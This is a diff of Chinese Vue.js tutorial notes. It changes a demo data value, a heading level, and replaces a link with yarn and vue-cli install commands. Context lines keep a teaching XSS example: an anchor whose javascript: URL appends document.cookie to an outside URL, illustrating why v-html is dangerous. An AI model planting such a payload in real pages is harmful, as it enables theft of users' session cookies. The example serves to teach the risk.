@@ -3294,7 +3294,7 @@ v-text指令：
 		new Vue({
 			el:'#root',
 			data:{
-				name:'尚硅谷',
+				name:'四川城市职业学院',
 				str:'<h3>你好啊！</h3>',
 				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
 			}
@@ -4852,7 +4852,7 @@ new Vue({
 
 
 
-### 3.2.3.$el
+#### 3.2.3.$el
 
 ​	vm.$el用来访问vm实例使用的根DOM元素。
 
@@ -4918,7 +4918,16 @@ npm uninstall @vue/cli -g
 
 **安装和创建推荐使用yarn的方式，因为该方式比npm更快：**
 
-https://blog.csdn.net/qq_45152044/article/details/122999616?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167966344016800213058109%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167966344016800213058109&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122999616-null-null.142^v76^pc_new_rank,201^v4^add_ask,239^v2^insert_chatgpt&utm_term=yarn%E5%88%9B%E5%BB%BAvue-cli%E9%A1%B9%E7%9B%AE&spm=1018.2226.3001.4187
+```shell
+npm uninstall -g yarn				# 卸载yarn
+npm i yarn -g						# 安装yarn
+yarn -v								# 检查yarn是否安装
+yarn global add @vue/cli			# 通过yarn下载cli
+vue create demo						# 创建项目（如出现vue不是内部命令提示，可按下面操作）
+yarn global bin						# 将路径配置到环境变量Path中
+```
+
+
 
 
 
